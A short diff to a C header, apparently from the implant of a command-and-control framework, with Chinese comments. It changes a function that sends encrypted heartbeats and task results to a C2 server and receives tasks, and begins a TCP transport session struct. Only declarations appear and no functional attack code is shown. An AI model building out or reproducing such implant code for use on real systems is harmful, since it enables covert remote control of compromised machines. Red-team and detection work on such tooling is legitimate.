@@ -10,10 +10,13 @@
 #include <schannel.h>
 
 /*
- * HTTP 传输交换：发送心跳+payload 到 C2，接收响应。
- * response 由调用方负责释放。
+ * HTTP transform 交换：每次请求都发送 encrypted_heartbeat metadata，可选发送 encrypted_result。
+ * encrypted_tasks 返回已按 server.output 解码后的任务密文。
  */
-INT TransportHttpExchange(const Profile* profile, const ByteBuf* metadata, const ByteBuf* payload, ByteBuf* response);
+INT TransportHttpTransformExchange(const Profile* profile,
+                                   const ByteBuf* encrypted_heartbeat,
+                                   const ByteBuf* encrypted_result,
+                                   ByteBuf* encrypted_tasks);
 
 /* TCP external 传输：长度前缀帧，payload 为已加密心跳。 */
 typedef struct TcpExternalSession {
